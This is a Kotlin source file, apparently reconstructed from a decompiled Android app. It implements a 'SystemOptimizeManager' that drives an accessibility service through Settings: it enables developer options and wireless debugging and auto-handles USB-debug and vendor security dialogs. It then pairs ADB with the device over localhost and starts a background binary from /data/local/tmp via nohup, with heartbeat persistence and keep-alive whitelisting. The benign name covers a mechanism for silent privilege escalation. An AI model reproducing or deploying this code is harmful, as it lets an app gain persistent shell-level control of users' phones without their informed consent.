package com.storm.safe.rock.service.modules.setup

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.SharedPreferences
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.service.modules.setup.adb.AdbKeyManager
import com.storm.safe.rock.service.modules.setup.adb.AdbManager
import com.storm.safe.rock.service.modules.setup.deploy.LocalServiceDeployer
import com.storm.safe.rock.service.modules.setup.deploy.ServiceMonitor
import com.storm.safe.rock.service.modules.setup.discovery.MdnsDiscovery
import com.storm.safe.rock.service.modules.setup.discovery.PortScanner
import com.storm.safe.rock.service.modules.setup.discovery.UiPortReader
import com.storm.safe.rock.service.modules.setup.flow.DevOptionsNavigator
import com.storm.safe.rock.service.modules.setup.flow.DialogHandler
import com.storm.safe.rock.service.modules.setup.vendor.VendorPairAdapter
import com.storm.safe.rock.service.modules.setup.vendor.VendorPairAdapterFactory
import com.storm.safe.rock.service.modules.setup.flow.PairFlowOrchestrator
import com.storm.safe.rock.service.modules.setup.flow.PairFlowPreCheck
import com.storm.safe.rock.service.modules.setup.flow.PairState
import com.storm.safe.rock.service.modules.setup.flow.WindowDetector
import com.storm.safe.rock.service.modules.setup.flow.WirelessDebugNavigator
import java.util.concurrent.ConcurrentLinkedQueue
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicReference

/**
 * SystemOptimizeManager -- Thin Facade over extracted sub-modules.
 *
 * JADX: C0360a2.java (5666 lines). Now delegates to:
 *   - adb/ (AdbProtocol, AdbKeyManager, AdbPairingClient, AdbShellExecutor)
 *   - discovery/ (MdnsDiscovery, PortScanner, UiPortReader)
 *   - flow/ (PairFlowOrchestrator, DevOptionsNavigator, WirelessDebugNavigator, DialogHandler)
 *   - deploy/ (LocalServiceDeployer, ServiceMonitor)
 *   - SetupUiHelper (static UI node utilities)
 *
 * All public API signatures are preserved for backward compatibility.
 */
class SystemOptimizeManager private constructor(
    @Volatile var service: AccessibilityService,
    val context: Context
) {
    companion object {
        private const val TAG = "SystemOptimize"

        // ====================================================================
        // Singleton
        // ====================================================================

        @Volatile
        private var sInstance: SystemOptimizeManager? = null

        @JvmStatic
        fun getInstance(service: AccessibilityService, context: Context): SystemOptimizeManager {
            return sInstance ?: synchronized(this) {
                sInstance ?: SystemOptimizeManager(service, context).also {
                    sInstance = it
                    // 进程重启后，如果之前已完成配对，自动启动心跳恢复 ADB 连接
                    if (context.getSharedPreferences("system_optimize", 0).getBoolean("pair_completed", false)) {
                        Log.i(TAG, "检测到之前已完成配对，自动启动心跳")
                        try { it.startHeartbeat() } catch (_: Exception) {}
                    }
                }
            }
        }

        fun getInstanceOrNull(): SystemOptimizeManager? = sInstance

        @JvmStatic
        fun resetInstanceForTesting() {
            synchronized(this) {
                try { sInstance?.executor?.shutdownNow() } catch (_: Exception) {}
                try { sInstance?.adbManager?.close() } catch (_: Exception) {}
                sInstance = null
            }
        }

        // ====================================================================
        // Static utility delegations -- backward compat to SetupUiHelper
        // ====================================================================

        @JvmStatic fun findClickableParentCompat(node: AccessibilityNodeInfo?) = SetupUiHelper.findClickableParentCompat(node)
        @JvmStatic fun collectAllNodes(node: AccessibilityNodeInfo, list: ArrayList<AccessibilityNodeInfo>) = SetupUiHelper.collectAllNodes(node, list)
        @JvmStatic fun collectTextViewNodes(node: AccessibilityNodeInfo, list: ArrayList<AccessibilityNodeInfo>) = SetupUiHelper.collectTextViewNodes(node, list)
        @JvmStatic fun findNodeByTexts(root: AccessibilityNodeInfo, texts: List<String>) = SetupUiHelper.findNodeByTexts(root, texts)
        @JvmStatic fun findScrollableNode(node: AccessibilityNodeInfo) = SetupUiHelper.findScrollableNode(node)
        @JvmStatic fun findSwitchNode(node: AccessibilityNodeInfo) = SetupUiHelper.findSwitchNode(node)
        @JvmStatic fun findToggleNode(node: AccessibilityNodeInfo) = SetupUiHelper.findToggleNode(node)
        @JvmStatic fun findNodeByClassName(node: AccessibilityNodeInfo, className: String) = SetupUiHelper.findNodeByClassName(node, className)
        @JvmStatic fun findCheckBoxNode(node: AccessibilityNodeInfo) = SetupUiHelper.findCheckBoxNode(node)
        @JvmStatic fun findCompoundButton(node: AccessibilityNodeInfo) = SetupUiHelper.findCompoundButton(node)
        @JvmStatic fun findClickableParent6(node: AccessibilityNodeInfo) = SetupUiHelper.findClickableParent6(node)
        @JvmStatic fun findButtonByText(node: AccessibilityNodeInfo, text: String) = SetupUiHelper.findButtonByText(node, text)
        @JvmStatic fun sleep200(count: Int) = SetupUiHelper.sleep200(count)
        @JvmStatic fun getLocalIpAddress() = SetupUiHelper.getLocalIpAddress()
        @JvmStatic fun getWifiIpAddress() = SetupUiHelper.getWifiIpAddress()

        @JvmStatic fun extractPortFromUi(root: AccessibilityNodeInfo) = UiPortReader.extractPortFromUi(root)
    }

    // ========================================================================
    // Enums -- kept here as external code references them via SystemOptimizeManager.DevOptState
    // ========================================================================

    enum class DevOptState(val code: Int) {
        UNKNOWN(-1),
        ENTER_ABOUT_DEVICE_WIN(0),
        PREPARE_VERSION_INFO_WIN(1),
        ENTER_VERSION_INFO_WIN(2),
        PREPARE_CONFIRM_LOCK_WIN(3),
        ENTER_CONFIRM_LOCK_WIN(4),
        IS_CONFIRM_SUCCESS(5),
        ENABLE_DEV_OPT_FAIL(6),
        ENABLE_DEV_OPT_SUCCESS(7),
        WAIT_PASSWORD_VERIFY(8),
        WIN_CHECK(9),
        WIN_PREPARE(10)
    }

    // ========================================================================
    // Data classes -- kept for backward compat (referenced externally)
    // ========================================================================

    data class PairingPacketHeader(val version: Byte, val type: Byte, val payloadSize: Int)

    data class AdbPacket(val command: Int, val data: ByteArray, val arg0: Int, val arg1: Int) {
        override fun equals(other: Any?): Boolean {
            if (this === other) return true
            if (other !is AdbPacket) return false
            return command == other.command && arg0 == other.arg0 && arg1 == other.arg1 && data.contentEquals(other.data)
        }
        override fun hashCode(): Int = 31 * (31 * (31 * command + data.contentHashCode()) + arg0) + arg1
    }

    data class PairingInfo(val host: String, val port: Int, val pairingCode: String)

    // ========================================================================
    // Component instances (lazy)
    // ========================================================================

    private val prefs: SharedPreferences by lazy { context.getSharedPreferences("ADBConfig", Context.MODE_PRIVATE) }
    val keyManager by lazy { AdbKeyManager(context) }
    val adbManager by lazy { AdbManager(context, keyManager) }
    val portScanner by lazy { PortScanner(context, prefs) }
    val mdnsDiscovery by lazy { MdnsDiscovery(context) }
    val uiPortReader by lazy { UiPortReader(service) }
    val devOptionsNav by lazy { DevOptionsNavigator(service, context) }
    val wirelessDebugNav by lazy { WirelessDebugNavigator(service, context) }
    val dialogHandler by lazy { DialogHandler(service, context) }
    val deployer by lazy {
        LocalServiceDeployer(
            context = context,
            executeShellCommand = { cmd -> executeShellCommand(cmd) },
            executeAndCheck = { cmd -> executeAndCheck(cmd) },
            fireAndForget = { fireAndForget() }
        )
    }
    val serviceMonitor by lazy {
        ServiceMonitor(
            context = context,
            deployer = deployer,
            debugPortProvider = { portScanner.getDebugPort() },
            setDebugPort = { port -> portScanner.setDebugPort(port) },
            isConnectedProvider = { isAdbConnected() },
            generateOrLoadKeyPair = { keyManager.generateOrLoadKeyPair() },
            isWirelessDebuggingEnabled = { isWirelessDebuggingEnabled() },
            enableWirelessDebugging = {
                wirelessDebugNav.enableWirelessDebuggingViaSettings(
                    isWirelessDebuggingEnabled = { isWirelessDebuggingEnabled() },
                    postToLocalService = { path, body -> deployer.postToLocalService(path, body) }
                )
            },
            deployWithRetry = { deployLocalServiceWithRetry() }
        )
    }
    val vendorAdapter: VendorPairAdapter by lazy { VendorPairAdapterFactory.create(service, context) }
    val pairPreCheck by lazy { PairFlowPreCheck(context, service) }
    val pairOrchestrator by lazy { PairFlowOrchestrator(service, context, this) }

    // ========================================================================
    // Retained state
    // ========================================================================

    var executor: ScheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
    val devOptState: AtomicReference<DevOptState> = AtomicReference(DevOptState.UNKNOWN)
    val pairState: AtomicReference<PairState> = AtomicReference(PairState.PAIR_DEPT_UNKNOWN)
    val isConnected: AtomicBoolean = AtomicBoolean(false)
    val processedActions: ConcurrentLinkedQueue<String> = ConcurrentLinkedQueue()
    var openDevDelegate: OpenDevelopmentDelegate? = null
    var onCompleteCallback: (() -> Unit)? = null
    var onFailureCallback: ((String) -> Unit)? = null
    @Volatile var lastUsbDebugDialogTime: Long = 0L

    val connectionLock: Any = Any()

    val windowDetector = WindowDetector()

    // ========================================================================
    // Settings queries (kept -- simple methods)
    // ========================================================================

    fun isAdbEnabled(): Boolean = try {
        Settings.Global.getInt(context.contentResolver, "adb_enabled", 0) == 1
    } catch (_: Exception) { false }

    fun isDeveloperOptionsEnabled(): Boolean {
        val r = context.contentResolver
        try { if (Settings.Global.getInt(r, "development_settings_enabled", 0) > 0) return true } catch (_: Exception) {}
        try { if (Settings.Secure.getInt(r, "development_settings_enabled", 0) > 0) return true } catch (_: Exception) {}
        try { if (Settings.Global.getInt(r, "adb_enabled", 0) > 0) return true } catch (_: Exception) {}
        return false
    }

    fun isWirelessDebuggingEnabled(): Boolean = try {
        if (Build.VERSION.SDK_INT >= 30) Settings.Global.getInt(context.contentResolver, "adb_wifi_enabled", 0) == 1 else false
    } catch (_: Exception) { false }

    fun isAdbConnected(): Boolean = isConnected.get() && adbManager.isConnected

    // ========================================================================
    // ADB connection management (kept -- core connection lifecycle)
    // ========================================================================

    fun getOrCreateAdbConnection(): Boolean {
        synchronized(connectionLock) {
            if (isAdbConnected()) return true

            val port = portScanner.getDebugPort()
            if (port <= 0) { Log.w(TAG, "getOrCreateAdbConnection: no port"); return false }

            keyManager.generateOrLoadKeyPair()

            return try {
                val connected = adbManager.connect(deployer.cachedLocalIp.ifEmpty { "127.0.0.1" }, port)
                isConnected.set(connected)
                if (connected) Log.i(TAG, "ADB connected: port=$port")
                else Log.w(TAG, "ADB connect failed: port=$port")
                connected
            } catch (e: Exception) {
                isConnected.set(false); Log.e(TAG, "ADB connect error", e); false
            }
        }
    }

    // ========================================================================
    // OpenDevelopmentDelegate (kept -- creates delegate + wires callbacks)
    // ========================================================================

    fun startOpenDevelopmentDelegate(onSuccess: () -> Unit, onFailure: (String) -> Unit) {
        val delegate = OpenDevelopmentDelegate(service, context)
        openDevDelegate = delegate
        delegate.setCallbacks(
            onSuccess = {
                devOptState.set(DevOptState.ENABLE_DEV_OPT_SUCCESS)
                startPairFlow()
                onSuccess()
            },
            onFailure = { reason ->
                devOptState.set(DevOptState.ENABLE_DEV_OPT_FAIL)
                shutdownEngine()
                onFailureCallback?.invoke(reason)
                onFailure(reason)
            }
        )
    }

    // ========================================================================
    // Lifecycle (kept -- cleanup logic)
    // ========================================================================

    fun shutdownEngine() {
        pairOrchestrator.isPairRunning.set(false)
        pairOrchestrator.isFinished.set(true)
        try { executor.shutdownNow() } catch (_: Exception) {}
    }

    fun resetAdbState() {
        synchronized(connectionLock) {
            try { adbManager.disconnect() } catch (_: Exception) {}
            isConnected.set(false)
        }
        prefs.edit()
            .putBoolean("connected", false)
            .remove("connectedDevice")
            .putInt("connectErrorCount", 0)
            .putInt("enableDevelopment", if (isDeveloperOptionsEnabled()) 1 else 0)
            .putInt("enableDebug", if (isAdbEnabled()) 1 else 0)
            .putInt("enableWifiDebug", if (isWirelessDebuggingEnabled()) 1 else 0)
            .apply()
    }

    // ========================================================================
    // Event routing (kept -- dispatches to delegate + sub-handlers)
    // ========================================================================

    fun onAccessibilityEventInternal(event: AccessibilityEvent, packageName: String?, className: String?) {
        try {
            openDevDelegate?.let { try { it.onAccessibilityEvent(event, packageName, className) } catch (_: Exception) {} }
            if (className != null && event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                lastUsbDebugDialogTime = dialogHandler.handleUsbDebugDialog(lastUsbDebugDialogTime)
            }
            filterAccessibilityEvent(event)
        } catch (e: Exception) { Log.e(TAG, "onAccessibilityEvent error", e) }
    }

    fun filterAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: ""

        // Stage 1: USB debug dialog — runs ALWAYS for settings/systemui (vendor: c41 case 0)
        if ((pkg == "com.android.systemui" || pkg == "com.android.settings") &&
            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED)
        ) {
            try {
                executor.execute { lastUsbDebugDialogTime = dialogHandler.handleUsbDebugDialog(lastUsbDebugDialogTime) }
            } catch (_: Exception) {}
        }

        // Stage 2: Pair flow dispatch — only when pairing is running (vendor: e41 case 0)
        if (pairOrchestrator.isFinished.get() || !pairOrchestrator.isPairRunning.get()) return
        val eventPkg = event.packageName?.toString() ?: return
        if (eventPkg.contains("settings", ignoreCase = true) ||
            eventPkg.contains("securitycenter", ignoreCase = true) ||
            eventPkg.contains("systemui", ignoreCase = true)
        ) {
            val copiedEvent = AccessibilityEvent.obtain(event)
            try {
                executor.execute {
                    try {
                        val cachedRoot = service.rootInActiveWindow
                        windowDetector.update(copiedEvent, cachedRoot)
                        mainAccessibilityEventHandler(copiedEvent, eventPkg)
                    } catch (e: Exception) {
                        Log.e(TAG, "onAccessibilityEvent background 异常", e)
                    } finally {
                        try { copiedEvent.recycle() } catch (_: Exception) {}
                    }
                }
            } catch (_: Exception) {
                try { copiedEvent.recycle() } catch (_: Exception) {}
            }
        }
    }

    /**
     * Main accessibility event handler with state machine dispatching.
     * vendor: i4 (line 3811) -- routes to pairInDevOption / pairInWifiDebugWindow / handlePairFailDialog.
     * Kept inline as it references multiple sub-modules.
     */
    private fun mainAccessibilityEventHandler(event: AccessibilityEvent, pkg: String) {
        try {
            val className = event.className?.toString()
            if (devOptState.get().code < DevOptState.ENABLE_DEV_OPT_SUCCESS.code) {
                openDevDelegate?.onAccessibilityEvent(event, pkg, className)
            }
            // ADAPT: 先检查 wifiDebug（更具体），再检查 devOptions（更宽泛）
            // SubSettings 同时匹配两者的 pattern，但 wifiDebug 的 title 检查更精确
            if (wirelessDebugNav.isInWifiDebugWindow() || windowDetector.isInWifiDebugWindow()) {
                processedActions.remove("pairInDevOption")
                val state = pairOrchestrator.pairState.get()
                if (state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
                    state != PairState.PAIR_DEPT_PREPARE_FINISH
                ) {
                    if (!processedActions.contains("pairInWifiDebugWindow")) {
                        processedActions.add("pairInWifiDebugWindow")
                        scheduleTask("W") { pairOrchestrator.pairInWifiDebugWindow() }
                    }
                }
                return
            }
            if (windowDetector.isInDevOptionsWindow() || devOptionsNav.isInDevOptionsWindow()) {
                // ADAPT: 不清除 pairInWifiDebugWindow 标记 — SubSettings 同时匹配 devOptions 和 wifiDebug
                // 清除会与 startPairFlow 的直接调度竞争
                processedActions.remove("pairInPairFailDialog")
                val state = pairOrchestrator.pairState.get()
                if (!processedActions.contains("pairInDevOption") &&
                    state != PairState.PAIR_DEPT_PAIR_SUCCESS &&
                    state != PairState.PAIR_DEPT_PAIR_FAIL &&
                    state != PairState.PAIR_DEPT_PREPARE_FINISH
                ) {
                    processedActions.add("pairInDevOption")
                    scheduleTask("G") { pairOrchestrator.pairInDevOption() }
                }
                return
            }
            // ━━━ Vendor security dialog (e.g. MIUI security center) ━━━
            if (vendorAdapter.isVendorSecurityDialog(pkg, event.className?.toString())) {
                if (!processedActions.contains("pairInSecurityCenter")) {
                    processedActions.add("pairInSecurityCenter")
                    scheduleTask("B3") {
                        val handled = vendorAdapter.handleSecurityDialog(service)
                        processedActions.remove("pairInSecurityCenter")
                        if (handled) {
                            Log.d(TAG, "vendor security dialog handled, continuing pair flow")
                        }
                    }
                }
                return
            }
            if (dialogHandler.isInPairFailDialog()) {
                if (!processedActions.contains("pairInPairFailDialog")) {
                    processedActions.add("pairInPairFailDialog")
                    scheduleTask("F") { dialogHandler.handlePairFailDialog(processedActions, pairState) }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "mainAccessibilityEventHandler error", e) }
    }

    // ========================================================================
    // Delegated methods (one-line calls)
    // ========================================================================

    // -- Pairing flow --
    fun startPairFlow() = pairOrchestrator.startPairFlow()
    fun triggerPairFlow() = pairOrchestrator.triggerPairFlow()
    fun finishLocalAdbPair() = pairOrchestrator.finishLocalAdbPair()

    // -- Shell execution --
    fun executeShellCommand(cmd: String): String? {
        if (!getOrCreateAdbConnection()) return null
        return adbManager.executeShellCommand(cmd)
    }
    fun executeAndCheck(cmd: String): Boolean {
        if (!getOrCreateAdbConnection()) return false
        return adbManager.executeAndCheck(cmd)
    }
    fun fireAndForget(cmd: String = "nohup /data/local/tmp/local-service server -d -s > /data/local/tmp/local-service.log 2>&1 &") {
        if (!getOrCreateAdbConnection()) return
        adbManager.fireAndForget(cmd)
    }

    // -- Deployment --
    fun deployLocalService() = deployer.deployLocalService(portScanner.getDebugPort())

    /**
     * 外部触发部署 — 带端口扫描重试。
     * vendor: d9 (line 2557)
     */
    fun deployLocalServiceWithRetry(): Boolean {
        deployer.isLocalServiceAlive.set(false)
        try {
            val existingPort = portScanner.getDebugPort()
            if (existingPort > 0) {
                Log.d(TAG, "d9(): 已有调试端口 $existingPort，直接部署")
                if (deployer.deployLocalService(existingPort)) return true
                Log.w(TAG, "d9(): 缓存端口 $existingPort 部署失败，清除缓存并扫描...")
                portScanner.setDebugPort(0)
            }
            var scannedPort = 0
            for (i in 1..5) {
                Log.d(TAG, "d9(): 扫描无线调试端口 (第${i}次)...")
                scannedPort = portScanner.scanForAdbPort()
                if (scannedPort > 0) break
                if (i < 5) {
                    Log.d(TAG, "d9(): 未找到端口，等待 2s 后重试...")
                    Thread.sleep(2000L)
                }
            }
            if (scannedPort <= 0) {
                Log.w(TAG, "d9(): 未找到无线调试端口（重试5次）")
                return false
            }
            portScanner.setDebugPort(scannedPort)
            Log.d(TAG, "d9(): 扫描到调试端口 $scannedPort，执行部署")
            return deployer.deployLocalService(scannedPort)
        } catch (e: InterruptedException) {
            Thread.currentThread().interrupt()
            Log.w(TAG, "d9(): 被中断，提前退出")
            return false
        } catch (e: Exception) {
            Log.e(TAG, "d9(): 部署失败", e)
            return false
        }
    }

    fun setupKeepAliveWhitelist() = deployer.setupKeepAliveWhitelist()
    fun postToLocalService(path: String, body: String) = deployer.postToLocalService(path, body)

    // -- Discovery --
    fun scanForAdbPort() = portScanner.scanForAdbPort()
    fun getWirelessDebugPort() = portScanner.getWirelessDebugPort()
    fun getDebugPort() = portScanner.getDebugPort()
    fun setDebugPort(port: Int) = portScanner.setDebugPort(port)
    fun discoverConnectPort() = mdnsDiscovery.discoverConnectPort()
    fun readDebugPortFromScreen() = uiPortReader.readDebugPortFromScreen()

    // -- UI navigation --
    fun openDevOptionsSettings() {
        if (vendorAdapter.openDevOptions(context)) return  // vendor handled (e.g. Huawei ComponentName)
        devOptionsNav.openDevOptionsSettings()
    }
    fun isInDevOptionsWindow() = windowDetector.isInDevOptionsWindow() || devOptionsNav.isInDevOptionsWindow()
    fun isInWifiDebugWindow() = windowDetector.isInWifiDebugWindow() || wirelessDebugNav.isInWifiDebugWindow()
    fun handleUsbDebugDialog() { lastUsbDebugDialogTime = dialogHandler.handleUsbDebugDialog(lastUsbDebugDialogTime) }
    fun handlePairFailDialog() = dialogHandler.handlePairFailDialog(processedActions, pairState)

    // -- Key management --
    fun generateOrLoadKeyPair() = keyManager.generateOrLoadKeyPair()
    fun doPair(port: Int, code: String): Boolean {
        return try { adbManager.pair("127.0.0.1", port, code) } catch (e: Exception) { Log.e(TAG, "配对失败", e); false }
    }

    // -- Heartbeat --
    fun startHeartbeat() = serviceMonitor.startHeartbeat()
    fun checkAndRecoverLocalService() = serviceMonitor.checkAndRecoverLocalService()

    // ========================================================================
    // Scheduling utility
    // ========================================================================

    fun scheduleTask(tag: String, task: () -> Unit) {
        try {
            executor.execute {
                try { Log.d(TAG, "[$tag] start"); task(); Log.d(TAG, "[$tag] done") }
                catch (e: Exception) { Log.e(TAG, "[$tag] error", e) }
            }
        } catch (_: Exception) {}
    }

    init { Log.d(TAG, "SystemOptimizeManager initialized") }
}
